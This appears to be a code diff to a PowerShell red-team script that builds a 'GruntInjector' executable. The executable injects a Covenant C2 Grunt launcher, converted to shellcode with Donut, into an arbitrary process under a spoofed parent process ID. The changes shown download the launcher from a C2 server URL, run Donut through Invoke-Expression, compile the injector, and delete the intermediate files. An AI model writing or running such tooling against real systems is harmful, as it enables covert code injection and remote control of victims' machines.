@@ -4,7 +4,7 @@
 #         a program that will inject the binary launcher into an arbitrary process
 #         with an arbitrary PPID. Uses Rasta Mouse's Donut technique from 
 #         https://rastamouse.me/2019/08/covenant-donut-tikitorch/
-# Dependencies: Donut (https://github.com/TheWover/donut), installed in the current directory
+# Dependencies: Donut (https://github.com/TheWover/donut)
 
 # Command line arguments
 param(
@@ -18,22 +18,24 @@ param(
 
     [Parameter(Mandatory = $false)]
     [string]
-    $DonutPath = "donut"
+    $DonutPath = "donut",
+
+    [Parameter(Mandatory = $false)]
+    [string]
+    $Outfile = "GruntInjector_$(Get-Date -Format `
+        "yyyy-MM-dd_HH.mm.ss")_v$DotNetFrameworkVersion.exe"
 )
 
 # Variables
+$ErrorActionPreference = "Stop"
 $LauncherAssemblyPath = "GruntLauncher.exe"
 $LauncherShellcodePath = "GruntLauncher.bin"
-$InjectorAssemblyPath = "GruntInjector.exe"
 If (-Not ($DotNetFrameworkVersion -In @("3.5", "4.0"))) {
     throw "[!] Invalid .NET Framework Version: should be 3.5 or 4.0"
 }
 
 # Download binary Grunt launcher from Covenant server
-$LauncherAssembly = (New-Object Net.WebClient).DownloadString($LauncherURL)
-
-# Write to disk
-Set-Content -Path $LauncherAssemblyPath -Value $LauncherAssembly
+$LauncherAssembly = (New-Object Net.WebClient).DownloadFile($LauncherURL, $LauncherAssemblyPath)
 
 # Use Donut to translate the binary launcher on disk into shellcode
 Invoke-Expression -Command "& '$DonutPath' $LauncherAssemblyPath -o $LauncherShellcodePath" | Out-Null
@@ -239,8 +241,7 @@ $Provider = New-Object Microsoft.CSharp.CSharpCodeProvider $CompilerOptions
 $CompilerParameters = New-Object System.CodeDom.Compiler.CompilerParameters
 $CompilerParameters.ReferencedAssemblies.Add("System.dll")
 $CompilerParameters.GenerateExecutable = $true 
-$CompilerParameters.CompilerOptions = "/optimize"
-$CompilerParameters.OutputAssembly = $InjectorAssemblyPath
+$CompilerParameters.OutputAssembly = $Outfile
 $Result = $Provider.CompileAssemblyFromSource($CompilerParameters, $GruntInjectorSource)
 If ($Result.Errors) {
     ForEach ($Error in $Result.Errors) {
@@ -252,7 +253,5 @@ Else {
 }
 
 # Clean up launcher binary & shellcode
-<#
 Remove-Item -Path $LauncherAssemblyPath
 Remove-Item -Path $LauncherShellcodePath
-#>
